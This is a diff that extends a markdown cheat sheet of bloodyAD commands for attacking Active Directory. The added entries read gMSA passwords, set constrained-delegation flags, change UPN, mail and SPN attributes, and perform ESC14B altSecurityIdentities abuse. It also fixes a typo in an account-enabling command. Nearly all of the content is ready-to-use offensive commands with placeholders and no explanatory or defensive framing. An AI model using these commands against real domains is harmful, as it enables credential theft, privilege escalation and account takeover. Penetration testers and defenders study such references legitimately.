@@ -30,6 +30,11 @@ bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add groupMember '
 bloodyAD --host <target> -d <domain>  -u '<user>' -p '<passwd>' add shadowCredentials <target_user>
 ```
 
+## ReadGMSAPassword
+```
+bloodyAD --host <target> -d <domain> -u <user> -p <passwd> get object <target_username> --attr msDS-ManagedPassword
+```
+
 ## Disable preauth
 ```
 bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add uac '<target_obj>' -f DONT_REQ_PREAUTH
@@ -42,5 +47,30 @@ bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add rbcd '<target
 
 ## Enable Account
 ```
-bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd' remove uac 'account' -f ACCOUNTDISABLE
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' remove uac '<account>' -f ACCOUNTDISABLE
+```
+
+## TRUSTED_TO_AUTH_FOR_DELEGATION 
+```
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' add uac <target_username> -f TRUSTED_TO_AUTH_FOR_DELEGATION
+```
+
+## Modify UPN
+```
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set object <old_upn> userPrincipalName -v <new_upn>
+```
+
+## Mail Attribute
+```
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set object <target_user> mail -v <newmail@test.local>
+```
+
+## Write SPN
+```
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set object <target>servicePrincipalName -v '<domain/meow>'
+```
+
+## ESC14B - Modify the altSecurityIdentities attribute
+```
+bloodyAD --host <target> -d <domain> -u '<user>' -p '<passwd>' set object <target_user> altSecurityIdentities -v 'X509:<RFC822>pain@meow.local'
 ```
